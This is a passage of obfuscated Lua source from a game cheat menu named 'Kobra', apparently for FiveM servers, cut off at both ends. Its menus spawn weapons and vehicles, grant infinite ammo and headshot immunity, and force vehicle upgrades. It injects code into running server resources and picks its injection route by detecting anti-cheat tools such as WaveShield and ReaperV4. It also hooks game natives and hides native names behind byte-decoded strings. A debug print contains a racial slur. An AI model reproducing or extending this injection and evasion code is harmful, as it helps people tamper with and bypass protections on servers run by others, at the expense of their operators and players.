                                ]]);else print("Console Spam Stopped...");v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v60("Weapon Name","WEAPON_",function(v585) if (v585 and (v585~="")) then v267:SpawnSelectedWeapon(v585);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v267:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v267:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1970 -(1618 + 351) ,values=v267:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v438) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v438));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v267:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v439) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v439));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1 + 0 ,values=v267:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v440) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v440));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1 + 0 ,values=v267:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v441) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v441));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1767 -(1536 + 230) ,values=v267:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v442) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v442));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=2 -1 ,values=v267:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v443) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v443));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1,values=v267:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v444) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v444));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=2 -1 ,values=v267:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v445) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v445));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1 -0 ,values=v267:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v446) v267:SpawnSelectedWeapon(v267:GetWeaponModelFromLabel(v446));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v447) if v447 then v267:Notify("success","Kobra","Enabled Infinite Ammo",5000);v267:EnableInfiniteAmmo();else local v633=0 + 0 ;while true do if (0==v633) then v267:Notify("error","Kobra","Disabled Infinite Ammo",9237 -4237 );v267:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v448) if v448 then v267:Notify("success","Kobra","Enabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end else v267:Notify("error","Kobra","Disabled Anti-Headshot",3971 + 1029 );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v49("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v449) v43=v449 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v450) v42=v450 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v60("Addon Vehicle","",function(v586) if (v586 and (v586~="")) then v267:SpawnSelectedVehicle(v586,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=329 -(287 + 41) ,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v451) v267:SpawnSelectedVehicle(v451,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v452) v267:SpawnSelectedVehicle(v452,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=839 -(669 + 169) ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v453) v267:SpawnSelectedVehicle(v453,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v454) v267:SpawnSelectedVehicle(v454,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=1,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v455) v267:SpawnSelectedVehicle(v455,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1 -0 ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v456) v267:SpawnSelectedVehicle(v456,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v457) v267:SpawnSelectedVehicle(v457,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v458) v267:SpawnSelectedVehicle(v458,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v459) v267:SpawnSelectedVehicle(v459,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v460) v267:SpawnSelectedVehicle(v460,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=506 -(223 + 282) ,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v461) v267:SpawnSelectedVehicle(v461,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1405 -(1257 + 147) ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v462) v267:SpawnSelectedVehicle(v462,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v463) v267:SpawnSelectedVehicle(v463,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v60("Set License Plate","",function(v587) if (v587 and (v587~="")) then local v736=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v587);MachoInjectResourceRaw("any",v736);else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v267:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() v12:Notify("success","Kobra","Cleaned Vehicle",1505 + 1495 );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);end},{type="button",label="Force Vehicle Engine",onSelect=function() v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() v12:Notify("success","Kobra","Vehicle Max Upgraded",1375 + 1625 );local v464=GetResourceState("WaveShield")=="started" ;local v465=GetResourceState("ReaperV4")=="started" ;if v464 then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);elseif v465 then local v802=0;while true do if (v802==(0 + 0)) then print("using Reaper fallback");MachoInjectThread(0 -0 ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
